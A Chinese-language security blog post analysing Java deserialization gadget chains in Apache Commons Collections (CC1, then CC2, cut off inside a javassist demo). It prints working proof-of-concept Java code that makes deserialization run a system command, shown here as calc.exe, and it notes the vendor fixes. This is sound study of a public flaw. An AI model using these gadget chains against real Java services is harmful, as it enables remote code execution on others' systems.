style="width:auto;height:auto;max-width:80%;max-height:80%;text-align:center;"><h2 id="CommonsCollections-1"><a href="#CommonsCollections-1" class="headerlink" title="CommonsCollections 1"></a>CommonsCollections 1</h2><p>Commons-Collections 为Java标准的Collections API提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。保证性能的同时大大简化代码。</p><p>影响版本：</p><ul><li>jdk &lt; 8u71</li><li>Commons Collections 3.1</li></ul><p>测试环境：</p><ul><li>JDK 1.7</li><li>Commons Collections 3.1</li></ul><h3 id="利用链-1"><a href="#利用链-1" class="headerlink" title="利用链"></a>利用链</h3><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">ObjectInputStream</span>.</span></span>read<span class="constructor">Object()</span></span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">AnnotationInvocationHandler</span>.</span></span>read<span class="constructor">Object()</span></span><br><span class="line"><span class="constructor">Map(Proxy)</span>.entry<span class="constructor">Set()</span></span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">AnnotationInvocationHandler</span>.</span></span>invoke<span class="literal">()</span></span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">LazyMap</span>.</span></span>get<span class="literal">()</span></span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">ChainedTransformer</span>.</span></span>transform<span class="literal">()</span></span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">ConstantTransformer</span>.</span></span>transform<span class="literal">()</span></span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">InvokerTransformer</span>.</span></span>transform<span class="literal">()</span></span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">Method</span>.</span></span>invoke<span class="literal">()</span></span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">Class</span>.</span></span>get<span class="constructor">Method()</span></span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">InvokerTransformer</span>.</span></span>transform<span class="literal">()</span></span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">Method</span>.</span></span>invoke<span class="literal">()</span></span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">Runtime</span>.</span></span>get<span class="constructor">Runtime()</span></span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">InvokerTransformer</span>.</span></span>transform<span class="literal">()</span></span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">Method</span>.</span></span>invoke<span class="literal">()</span></span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">Runtime</span>.</span></span>exec<span class="literal">()</span></span><br></pre></td></tr></table></figure><h3 id="利用链分析-1"><a href="#利用链分析-1" class="headerlink" title="利用链分析"></a>利用链分析</h3><p>先分析后半段，commons collections中有一个Transformer接口，其中包含一个transform方法，通过实现此接口来达到类型转换的目的。</p><img src="/2021/04/13/Java_04/20210402112727.png"><p>其中有众多类实现了此接口，cc中主要利用到了以下三个。</p><ul><li>InvokerTransformer</li></ul><p>其transform方法实现了通过反射来调用某方法：</p><img src="/2021/04/13/Java_04/20210402112848.png"><ul><li>ConstantTransformer</li></ul><p>其transform方法将输入原封不动的返回：</p><img src="/2021/04/13/Java_04/20210402113024.png"><ul><li>ChainedTransformer</li></ul><p>其transform方法就是一个链式调用，前面transform的输出作为下一次transform的输入</p><img src="/2021/04/13/Java_04/20210402113130.png"><p>将这是三个transform结合起来，可以反射runtime实现任意命令执行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cc1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="comment">//Class runtimeClass=Class.forName("java.lang.Runtime");</span></span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line"><span class="class">                //<span class="title">runtime</span></span>=runtimeClass.getMethod(<span class="string">"getRuntime"</span>).invoke(<span class="keyword">null</span>);</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123;</span><br><span class="line">                        String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//runtimeClass.getMethod("exec", String.class).invoke(runtime,"calc.exe");</span></span><br><span class="line">                new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"calc.exe"&#125;)</span><br><span class="line">        &#125;);</span><br><span class="line">        chain.transform(<span class="string">"2333"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里 <code>Class[].class</code> 是因为这里使用反射调用getMethod（其实是getMethod反射getMethod然后调用），有个可变参数，所以这里使用 <code>Class[].class</code>，后面也要使用<code>Class[0]</code>占位</p><p><img src="/2021/04/13/Java_04/20210402144526.png" alt="image-20210402144525602"></p><p>这里不直接使用<code>Runtime.getRuntime()</code>，是因为Runtime.getRuntime()返回的是一个Runtime的实例，而Runtime并没有继承Serializable，所以这里会序列化失败。</p><p>然后找哪里调用transform函数，cc1使用的是<code>Lazymap.get</code></p><p><img src="/2021/04/13/Java_04/20210402145208.png" alt="image-20210402145153536"></p><p>这里不能直接创建LazyMap对象，需要使用反射的方法创建对象</p><p><img src="/2021/04/13/Java_04/20210402145617.png" alt="image-20210402145611534"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cc1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="comment">//Class runtimeClass=Class.forName("java.lang.Runtime");</span></span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line"><span class="class">                //<span class="title">runtime</span></span>=runtimeClass.getMethod(<span class="string">"getRuntime"</span>).invoke(<span class="keyword">null</span>);</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123;</span><br><span class="line">                        String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//runtimeClass.getMethod("exec", String.class).invoke(runtime,"calc.exe");</span></span><br><span class="line">                new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"calc.exe"&#125;)</span><br><span class="line">        &#125;);</span><br><span class="line">        HashMap innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Constructor[] constructors = Class.forName(<span class="string">"org.apache.commons.collections.map.LazyMap"</span>).getDeclaredConstructors();</span><br><span class="line">        Constructor constructor = constructors[<span class="number">0</span>];</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        LazyMap map = (LazyMap) constructor.newInstance(innermap, chain);</span><br><span class="line">        map.get(<span class="string">"2333"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么只需要再找到一个地方调用get方法，并且可以传入任意值。</p><p>分析利用链的前半部分，AnnotationInvocationHandler的readObject函数，这是jre7.0的一个类，如果<code>this.memberValues</code>是一个动态代理类，那么就可以调用其invoke函数</p><p><img src="/2021/04/13/Java_04/20210402155824.png" alt="image-20210402155823076"></p><p>动态代理可以参考：<a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1264804593397984" target="_blank" rel="noopener">https://www.liaoxuefeng.com/wiki/1252599548343744/1264804593397984</a></p><p>动态代理可以实例化一个接口，然后调用其方法，动态代理其实也是实例化一个类去实现接口，只不过是将接口方法“代理”给<code>InvocationHandler</code>的invoke方法完成。</p><p>动态代理之于反序列化漏洞的意义个人认为拓展了反序列化的攻击面，可以拓展任意一个方法到代理内的invoke方法中。</p><p>继续利用链分析，这里继续将代理类的handler设置为AnnotationInvocationHandler（其实现了InvocationHandler，所以可以被设置为代理类的handler），其handler调用了get函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object var1, Method var2, Object[] var3)</span> </span>&#123;</span><br><span class="line">    String var4 = var2.getName();</span><br><span class="line">    Class[] var5 = var2.getParameterTypes();</span><br><span class="line">    <span class="keyword">if</span> (var4.equals(<span class="string">"equals"</span>) &amp;&amp; var5.length == <span class="number">1</span> &amp;&amp; var5[<span class="number">0</span>] == Object<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.equalsImpl(var3[<span class="number">0</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var5.length != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> AssertionError(<span class="string">"Too many parameters for an annotation method"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">byte</span> var7 = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">switch</span>(var4.hashCode()) &#123;</span><br><span class="line">            <span class="keyword">case</span> -<span class="number">1776922004</span>:</span><br><span class="line">                <span class="keyword">if</span> (var4.equals(<span class="string">"toString"</span>)) &#123;</span><br><span class="line">                    var7 = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">147696667</span>:</span><br><span class="line">                <span class="keyword">if</span> (var4.equals(<span class="string">"hashCode"</span>)) &#123;</span><br><span class="line">                    var7 = <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1444986633</span>:</span><br><span class="line">                <span class="keyword">if</span> (var4.equals(<span class="string">"annotationType"</span>)) &#123;</span><br><span class="line">                    var7 = <span class="number">2</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span>(var7) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">this</span>.toStringImpl();</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">this</span>.hashCodeImpl();</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">this</span>.type;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                Object var6 = <span class="keyword">this</span>.memberValues.get(var4);</span><br></pre></td></tr></table></figure><p>那么只需要设置<code>this.memberValues</code>为我们构造的map就可以在序列化对象后自动执行命令了。</p><h3 id="测试代码-1"><a href="#测试代码-1" class="headerlink" title="测试代码"></a>测试代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cc1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="comment">//Class runtimeClass=Class.forName("java.lang.Runtime");</span></span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line"><span class="class">                //<span class="title">runtime</span></span>=runtimeClass.getMethod(<span class="string">"getRuntime"</span>).invoke(<span class="keyword">null</span>);</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123;</span><br><span class="line">                        String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//runtimeClass.getMethod("exec", String.class).invoke(runtime,"calc.exe");</span></span><br><span class="line">                new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"calc.exe"&#125;)</span><br><span class="line">        &#125;);</span><br><span class="line">        HashMap innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Constructor[] constructors = Class.forName(<span class="string">"org.apache.commons.collections.map.LazyMap"</span>).getDeclaredConstructors();</span><br><span class="line">        Constructor constructor = constructors[<span class="number">0</span>];</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Map map = (Map) constructor.newInstance(innermap, chain);</span><br><span class="line"><span class="comment">//        map.get("2333");</span></span><br><span class="line"></span><br><span class="line">        Constructor handler_constructor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        handler_constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler map_handler = (InvocationHandler)handler_constructor.newInstance(Override<span class="class">.<span class="keyword">class</span>,<span class="title">map</span>)</span>;</span><br><span class="line">        Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<span class="keyword">new</span> Class[]&#123;Map<span class="class">.<span class="keyword">class</span>&#125;,<span class="title">map_handler</span>)</span>;<span class="comment">//创建代理对象</span></span><br><span class="line"></span><br><span class="line">        Constructor AnnotationInvocationHandler_Constructor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>,<span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        AnnotationInvocationHandler_Constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler) AnnotationInvocationHandler_Constructor.newInstance(Override<span class="class">.<span class="keyword">class</span>,<span class="title">proxy_map</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//序列化数据写入文件</span></span><br><span class="line">            ObjectOutputStream obout = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">            obout.writeObject(handler);</span><br><span class="line">            <span class="comment">//从文件中读取并反序列化数据</span></span><br><span class="line">            ObjectInputStream obin = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">            obin.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里第一个参数是Override.class因为在创建实例的时候对传入的第一个参数调用了isAnnotation方法来判断其是否为注解类</p><p><img src="/2021/04/13/Java_04/20210402210831.png" alt="image-20210402210830063"></p><p><img src="/2021/04/13/Java_04/20210402210844.png" alt="image-20210402210841841"></p><p>而Override.class正是java自带的一个注解类：</p><p><img src="/2021/04/13/Java_04/20210402210917.png" alt="image-20210402210916001"></p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>Java 对AnnotationInvocationHandler的修复：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">AnnotationInvocationHandler</span>.</span><span class="module"><span class="identifier">UnsafeAccessor</span>.</span></span>set<span class="constructor">Type(<span class="params">this</span>, <span class="params">t</span>)</span>;</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">AnnotationInvocationHandler</span>.</span><span class="module"><span class="identifier">UnsafeAccessor</span>.</span></span>set<span class="constructor">MemberValues(<span class="params">this</span>, <span class="params">mv</span>)</span>;</span><br></pre></td></tr></table></figure><p>readObjetc时会再重新设置memberValues的值，序列化之后的数据就没用了</p><p>commons-collections的修复：</p><p><img src="/2021/04/13/Java_04/20210402215142.png" alt="image-20210402215053099"></p><p>在 readObject, writeObject 时都做了检测, 需要设置对应的 Property 为 true 才能反序列化 InvokerTransformer</p><h2 id="CommonsCollections-2"><a href="#CommonsCollections-2" class="headerlink" title="CommonsCollections 2"></a>CommonsCollections 2</h2><p>影响版本：</p><ul><li>Commons Collections 4.0</li></ul><p>测试环境：</p><ul><li>JDK 1.7</li><li>Commons Collections 4.0</li></ul><h3 id="利用链-2"><a href="#利用链-2" class="headerlink" title="利用链"></a>利用链</h3><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">ObjectInputStream</span>.</span></span>read<span class="constructor">Object()</span></span><br><span class="line">    <span class="module-access"><span class="module"><span class="identifier">PriorityQueue</span>.</span></span>read<span class="constructor">Object()</span></span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">PriorityQueue</span>.</span></span>heapify<span class="literal">()</span></span><br><span class="line">            <span class="module-access"><span class="module"><span class="identifier">PriorityQueue</span>.</span></span>sift<span class="constructor">Down()</span></span><br><span class="line">                <span class="module-access"><span class="module"><span class="identifier">PriorityQueue</span>.</span></span>sift<span class="constructor">DownUsingComparator()</span></span><br><span class="line">                    <span class="module-access"><span class="module"><span class="identifier">TransformingComparator</span>.</span></span>compare<span class="literal">()</span></span><br><span class="line">                        <span class="module-access"><span class="module"><span class="identifier">InvokerTransformer</span>.</span></span>transform<span class="literal">()</span></span><br><span class="line">                                <span class="module-access"><span class="module"><span class="identifier">Method</span>.</span></span>invoke<span class="literal">()</span></span><br><span class="line">                                    <span class="module-access"><span class="module"><span class="identifier">TemplatesImpl</span>.</span></span><span class="keyword">new</span><span class="constructor">Transformer()</span></span><br><span class="line">                                    <span class="module-access"><span class="module"><span class="identifier">TemplatesImpl</span>.</span></span>get<span class="constructor">TransletInstance()</span></span><br><span class="line">                                         <span class="module-access"><span class="module"><span class="identifier">TemplatesImpl</span>.</span></span>defineTransletClasses</span><br><span class="line">                                         <span class="keyword">new</span><span class="constructor">Instance()</span></span><br><span class="line">                                            <span class="module-access"><span class="module"><span class="identifier">Runtime</span>.</span></span>exec<span class="literal">()</span></span><br></pre></td></tr></table></figure><h3 id="javassit"><a href="#javassit" class="headerlink" title="javassit"></a>javassit</h3><p>.java文件需要编译成.class文件后才能正常运行，而javassit是用于对生成的class文件进行修改，或以完全手动的方式，生成一个class文件。</p><p>Demo:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">javassit_test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">createPseson</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. 创建一个空类</span></span><br><span class="line">        CtClass cc = pool.makeClass(<span class="string">"Person"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 新增一个字段 private String name;</span></span><br><span class="line">        <span class="comment">// 字段名为name</span></span><br><span class="line">        CtField param = <span class="keyword">new</span> CtField(pool.get(<span class="string">"java.lang.String"</span>), <span class="string">"name"</span>, cc);</span><br><span class="line">        <span class="comment">// 访问级别是 private</span></span><br><span class="line">        param.setModifiers(Modifier.PRIVATE);</span><br><span class="line">        <span class="comment">// 初始值是 "xiaoming"</span></span><br><span class="line">        cc.addField(param, CtField.Initializer.constant(<span class="string">"xiaoming"</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 生成 getter、setter 方法</span></span><br><span class="line">        cc.addMethod(CtNewMethod.setter(<span class="string">"setName"</span>, param));</span><br><span class="line">        cc.addMethod(CtNewMethod.getter(<span class="string">"getName"</span>, param));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. 添加无参的构造函数</span></span><br><span class="line">        CtConstructor cons = <span class="keyword">new</span> CtConstructor(<span class="keyword">new</span> CtClass[]&#123;&#125;, cc);</span><br><span class="line">        cons.setBody(<span class="string">"&#123;name = \"xiaohong\";&#125;"</span>);</span><br><span class="line">        cc.addConstructor(cons);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5. 添加有参的构造函数</span></span><br><span class="line">        cons = <span class="keyword">new</span> CtConstructor(<span class="keyword">new</span> CtClass[]&#123;pool.get(<span class="string">"java.lang.String"</span>)&#125;, cc);</span><br><span class="line">        <span class="comment">// $0=this / $1,$2,$3... 代表方法参数</span></span><br><span class="line">        cons.setBody(<span class="string">"&#123;$0.name = $1;&#125;"</span>);</span><br><span class="line">        cc.addConstructor(cons);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 6. 创建一个名为printName方法，无参数，无返回值，输出name值</span></span><br><span class="line">        CtMethod ctMethod = <span class="keyword">new</span> 